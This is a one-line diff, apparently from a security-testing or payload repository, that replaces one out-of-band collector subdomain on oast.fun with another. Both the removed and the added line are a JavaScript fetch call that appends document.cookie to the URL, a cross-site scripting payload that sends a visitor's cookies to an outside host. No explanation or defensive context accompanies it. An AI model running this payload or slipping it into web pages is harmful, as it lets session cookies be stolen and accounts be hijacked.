@@ -1,1 +1,1 @@
-fetch('http://byglmhqnnehuqmhvvkhqrpbsqykld2g9p.oast.fun/'+document.cookie)
+fetch('http://graebkmxlqdbfvfwcyfwr068gz6dl4g0u.oast.fun/'+document.cookie)
